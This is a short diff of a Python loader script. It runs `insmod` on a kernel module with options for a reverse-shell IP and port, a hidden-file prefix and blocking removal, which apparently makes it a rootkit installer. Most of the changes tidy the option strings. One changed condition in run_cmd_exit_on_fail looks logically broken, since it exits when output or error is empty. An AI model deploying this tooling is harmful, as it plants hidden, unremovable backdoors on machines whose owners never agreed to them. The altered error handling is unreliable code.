@@ -94,8 +94,8 @@ def run_cmd_exit_on_fail(command, working_dir=None, run_with_os=False):
 	if run_with_os:
 		proc = Popen(command.split(), stdout=PIPE, stderr=STDOUT, cwd=working_dir, shell=True)
 		out, err = proc.communicate()
-		print(out)
-		if err:
+		if not out or not err:
+			print(out)
 			print_error(err)
 			sys.exit(1)
 
@@ -161,16 +161,16 @@ def load_module(module_path, config):
 	options = ""
 	# Assume PORT exists if IP exists
 	if "REVERSE_SHELL_IP" in config and config["REVERSE_SHELL_IP"] is not None:
-		options += " rev_shell_ip=\"{}\" ".format(config["REVERSE_SHELL_IP"])
-		options += " rev_shell_port=\"{}\" ".format(config["REVERSE_SHELL_PORT"])
+		options += "rev_shell_ip=\"{}\" ".format(config["REVERSE_SHELL_IP"])
+		options += "rev_shell_port=\"{}\" ".format(config["REVERSE_SHELL_PORT"])
 
 	if "HIDDEN_FILE_PREFIX" in config:
-		options += " hidden_file_prefix=\"{}\" ".format(config["HIDDEN_FILE_PREFIX"])
+		options += "hidden_file_prefix=\"{}\" ".format(config["HIDDEN_FILE_PREFIX"])
 
 	if config["BLOCK_REMOVAL"]:
-		options += " block_removal=1 "
+		options += "block_removal=1 "
 	else:
-		options += " block_removal=0 "
+		options += "block_removal=0 "
 
 	cmd = "insmod {} {}".format(module_path, options)
 	run_cmd_exit_on_fail(cmd, run_with_os=True)
